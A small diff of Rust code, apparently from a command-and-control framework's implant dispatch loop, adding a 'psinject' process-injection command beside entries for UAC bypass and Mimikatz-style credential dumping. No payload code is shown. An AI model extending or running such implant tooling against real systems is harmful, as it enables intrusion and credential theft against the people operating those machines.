@@ -216,6 +216,7 @@ fn links_loop(links: web::Data<Links>, args: Vec<String>) {
                     // use Apollo method, add others as well
                     "bypass-uac"        => println!("todo"),
                     // for now just use powershell
+                    "psinject"          => util::nonstd::process_inject(links.clone(), link_index, args),
                     "mimikatz"          => link_command(links.clone(), link_index, args),
                     "sharpkatz"         => println!("todo"),
                     "sassykitdi"        => println!("Ring0 link only"),
